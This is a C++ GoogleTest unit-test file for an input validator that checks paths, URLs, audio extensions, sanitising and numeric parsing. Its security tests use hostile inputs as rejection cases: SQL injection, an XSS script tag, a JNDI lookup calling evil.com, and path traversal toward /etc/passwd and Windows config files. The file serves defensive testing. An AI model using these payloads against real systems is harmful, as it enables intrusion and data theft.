#include <gtest/gtest.h>
#include "input_validator.hpp"

class InputValidatorTest : public ::testing::Test {
protected:
    void SetUp() override {
        // Any setup needed for tests
    }
};

TEST_F(InputValidatorTest, ValidFilePath) {
    EXPECT_TRUE(InputValidator::isValidFilePath("/path/to/file.txt"));
    EXPECT_TRUE(InputValidator::isValidFilePath("file.txt"));
    EXPECT_TRUE(InputValidator::isValidFilePath("C:\\path\\to\\file.txt"));
    EXPECT_TRUE(InputValidator::isValidFilePath("path/to/file"));
    EXPECT_TRUE(InputValidator::isValidFilePath("file"));
}

TEST_F(InputValidatorTest, InvalidFilePath) {
    EXPECT_FALSE(InputValidator::isValidFilePath(""));
    EXPECT_FALSE(InputValidator::isValidFilePath("path/../file.txt")); // Path traversal
    EXPECT_FALSE(InputValidator::isValidFilePath("path/..\\file.txt")); // Path traversal
    // Note: C++ string literals don't support null bytes in the middle, so we test differently
    EXPECT_FALSE(InputValidator::isValidFilePath(std::string(5000, 'a'))); // Too long
}

TEST_F(InputValidatorTest, ValidUrl) {
    EXPECT_TRUE(InputValidator::isValidUrl("https://example.com"));
    EXPECT_TRUE(InputValidator::isValidUrl("http://example.com"));
    EXPECT_TRUE(InputValidator::isValidUrl("https://www.example.com/path"));
    EXPECT_TRUE(InputValidator::isValidUrl("https://example.com:8080/path?param=value"));
    EXPECT_TRUE(InputValidator::isValidUrl("https://subdomain.example.com"));
}

TEST_F(InputValidatorTest, InvalidUrl) {
    EXPECT_FALSE(InputValidator::isValidUrl(""));
    EXPECT_FALSE(InputValidator::isValidUrl("not-a-url"));
    EXPECT_FALSE(InputValidator::isValidUrl("ftp://example.com")); // Only http/https supported
    EXPECT_FALSE(InputValidator::isValidUrl("https://"));
    EXPECT_FALSE(InputValidator::isValidUrl(std::string(3000, 'a'))); // Too long
}

TEST_F(InputValidatorTest, ValidAudioFile) {
    EXPECT_TRUE(InputValidator::isValidAudioFile("song.mp3"));
    EXPECT_TRUE(InputValidator::isValidAudioFile("song.wav"));
    EXPECT_TRUE(InputValidator::isValidAudioFile("song.flac"));
    EXPECT_TRUE(InputValidator::isValidAudioFile("song.ogg"));
    EXPECT_TRUE(InputValidator::isValidAudioFile("song.m4a"));
    EXPECT_TRUE(InputValidator::isValidAudioFile("song.aac"));
    EXPECT_TRUE(InputValidator::isValidAudioFile("song.wma"));
    EXPECT_TRUE(InputValidator::isValidAudioFile("SONG.MP3")); // Case insensitive
    EXPECT_TRUE(InputValidator::isValidAudioFile("Song.Mp3")); // Mixed case
}

TEST_F(InputValidatorTest, InvalidAudioFile) {
    EXPECT_FALSE(InputValidator::isValidAudioFile(""));
    EXPECT_FALSE(InputValidator::isValidAudioFile("song.txt"));
    EXPECT_FALSE(InputValidator::isValidAudioFile("song.exe"));
    EXPECT_FALSE(InputValidator::isValidAudioFile("song"));
    EXPECT_FALSE(InputValidator::isValidAudioFile(".mp3"));
    EXPECT_FALSE(InputValidator::isValidAudioFile("song.mp3.txt"));
}

TEST_F(InputValidatorTest, SanitizeInput) {
    // Test null byte removal - create string with null byte
    std::string test_string = "hello";
    test_string.push_back('\0');
    test_string += "world";
    
    std::string result = InputValidator::sanitizeInput(test_string);
    EXPECT_EQ(result, "helloworld");
    
    // Test control character removal (except newline and tab)
    EXPECT_EQ(InputValidator::sanitizeInput("hello\x01world"), "helloworld");
    EXPECT_EQ(InputValidator::sanitizeInput("hello\x02world"), "helloworld");
    EXPECT_EQ(InputValidator::sanitizeInput("hello\nworld"), "hello\nworld"); // Keep newline
    EXPECT_EQ(InputValidator::sanitizeInput("hello\tworld"), "hello\tworld"); // Keep tab
    
    // Test whitespace trimming
    EXPECT_EQ(InputValidator::sanitizeInput("  hello world  "), "hello world");
    EXPECT_EQ(InputValidator::sanitizeInput("\t\nhello world\n\t"), "hello world");
    
    // Test empty string
    EXPECT_EQ(InputValidator::sanitizeInput(""), "");
    EXPECT_EQ(InputValidator::sanitizeInput("   "), "");
}

TEST_F(InputValidatorTest, ContainsOnlySafeChars) {
    EXPECT_TRUE(InputValidator::containsOnlySafeChars("hello world"));
    EXPECT_TRUE(InputValidator::containsOnlySafeChars("hello-world"));
    EXPECT_TRUE(InputValidator::containsOnlySafeChars("hello_world"));
    EXPECT_TRUE(InputValidator::containsOnlySafeChars("hello.world"));
    EXPECT_TRUE(InputValidator::containsOnlySafeChars("hello/world"));
    EXPECT_TRUE(InputValidator::containsOnlySafeChars("hello\\world"));
    EXPECT_TRUE(InputValidator::containsOnlySafeChars("hello:world"));
    EXPECT_TRUE(InputValidator::containsOnlySafeChars(""));
    EXPECT_TRUE(InputValidator::containsOnlySafeChars("123"));
    EXPECT_TRUE(InputValidator::containsOnlySafeChars("Hello World 123"));
}

TEST_F(InputValidatorTest, ContainsUnsafeChars) {
    EXPECT_FALSE(InputValidator::containsOnlySafeChars("hello<world"));
    EXPECT_FALSE(InputValidator::containsOnlySafeChars("hello>world"));
    EXPECT_FALSE(InputValidator::containsOnlySafeChars("hello&world"));
    EXPECT_FALSE(InputValidator::containsOnlySafeChars("hello\"world"));
    EXPECT_FALSE(InputValidator::containsOnlySafeChars("hello'world"));
    EXPECT_FALSE(InputValidator::containsOnlySafeChars("hello;world"));
    EXPECT_FALSE(InputValidator::containsOnlySafeChars("hello|world"));
    EXPECT_FALSE(InputValidator::containsOnlySafeChars("hello`world"));
    EXPECT_FALSE(InputValidator::containsOnlySafeChars("hello$world"));
    EXPECT_FALSE(InputValidator::containsOnlySafeChars("hello%world"));
}

TEST_F(InputValidatorTest, ValidInteger) {
    EXPECT_TRUE(InputValidator::isValidInteger("123"));
    EXPECT_TRUE(InputValidator::isValidInteger("0"));
    EXPECT_TRUE(InputValidator::isValidInteger("-123"));
    EXPECT_TRUE(InputValidator::isValidInteger("+123"));
    EXPECT_TRUE(InputValidator::isValidInteger("999999999"));
}

TEST_F(InputValidatorTest, InvalidInteger) {
    EXPECT_FALSE(InputValidator::isValidInteger(""));
    EXPECT_FALSE(InputValidator::isValidInteger("123.45"));
    EXPECT_FALSE(InputValidator::isValidInteger("abc"));
    EXPECT_FALSE(InputValidator::isValidInteger("12a34"));
    EXPECT_FALSE(InputValidator::isValidInteger("12 34"));
    EXPECT_FALSE(InputValidator::isValidInteger("12.34"));
}

TEST_F(InputValidatorTest, ValidFloat) {
    EXPECT_TRUE(InputValidator::isValidFloat("123.45"));
    EXPECT_TRUE(InputValidator::isValidFloat("123"));
    EXPECT_TRUE(InputValidator::isValidFloat("0.0"));
    EXPECT_TRUE(InputValidator::isValidFloat("-123.45"));
    EXPECT_TRUE(InputValidator::isValidFloat("+123.45"));
    EXPECT_TRUE(InputValidator::isValidFloat(".5"));
    EXPECT_TRUE(InputValidator::isValidFloat("5."));
}

TEST_F(InputValidatorTest, InvalidFloat) {
    EXPECT_FALSE(InputValidator::isValidFloat(""));
    EXPECT_FALSE(InputValidator::isValidFloat("abc"));
    EXPECT_FALSE(InputValidator::isValidFloat("12a34"));
    EXPECT_FALSE(InputValidator::isValidFloat("12 34"));
    EXPECT_FALSE(InputValidator::isValidFloat("12..34"));
    EXPECT_FALSE(InputValidator::isValidFloat("12.34.56"));
}

TEST_F(InputValidatorTest, ValidLength) {
    EXPECT_TRUE(InputValidator::isValidLength("", 10));
    EXPECT_TRUE(InputValidator::isValidLength("hello", 10));
    EXPECT_TRUE(InputValidator::isValidLength("hello world", 20));
    EXPECT_TRUE(InputValidator::isValidLength("hello world", 11)); // Exact length
}

TEST_F(InputValidatorTest, InvalidLength) {
    EXPECT_FALSE(InputValidator::isValidLength("hello world", 5));
    EXPECT_FALSE(InputValidator::isValidLength("hello world", 10));
    EXPECT_FALSE(InputValidator::isValidLength("very long string", 5));
}

TEST_F(InputValidatorTest, EdgeCases) {
    // Test with various edge cases
    EXPECT_TRUE(InputValidator::isValidFilePath("a"));
    EXPECT_TRUE(InputValidator::isValidFilePath("a.b"));
    EXPECT_TRUE(InputValidator::isValidFilePath("a/b"));
    EXPECT_TRUE(InputValidator::isValidFilePath("a\\b"));
    
    EXPECT_FALSE(InputValidator::isValidFilePath(".."));
    EXPECT_FALSE(InputValidator::isValidFilePath("..."));
    EXPECT_FALSE(InputValidator::isValidFilePath("a/../b"));
    EXPECT_FALSE(InputValidator::isValidFilePath("a\\..\\b"));
    
    // Test URL edge cases
    EXPECT_TRUE(InputValidator::isValidUrl("https://a.com"));
    EXPECT_TRUE(InputValidator::isValidUrl("https://a.b.com"));
    EXPECT_FALSE(InputValidator::isValidUrl("https://"));
    EXPECT_FALSE(InputValidator::isValidUrl("http://"));
    EXPECT_FALSE(InputValidator::isValidUrl("https://a"));
}

TEST_F(InputValidatorTest, SecurityTests) {
    // Test for potential injection attacks
    EXPECT_FALSE(InputValidator::containsOnlySafeChars("'; DROP TABLE users; --"));
    EXPECT_FALSE(InputValidator::containsOnlySafeChars("<script>alert('xss')</script>"));
    EXPECT_FALSE(InputValidator::containsOnlySafeChars("${jndi:ldap://evil.com/a}"));
    
    // Test path traversal attempts
    EXPECT_FALSE(InputValidator::isValidFilePath("../../../etc/passwd"));
    EXPECT_FALSE(InputValidator::isValidFilePath("..\\..\\..\\windows\\system32\\config"));
    EXPECT_FALSE(InputValidator::isValidFilePath("path/..\\..\\file"));
    
    // Test null byte injection - create string with null byte
    std::string null_string = "file";
    null_string.push_back('\0');
    null_string += "name";
    EXPECT_FALSE(InputValidator::containsOnlySafeChars(null_string));
    
    std::string null_filepath = "file";
    null_filepath.push_back('\0');
    null_filepath += "name.txt";
    EXPECT_FALSE(InputValidator::isValidFilePath(null_filepath));
} 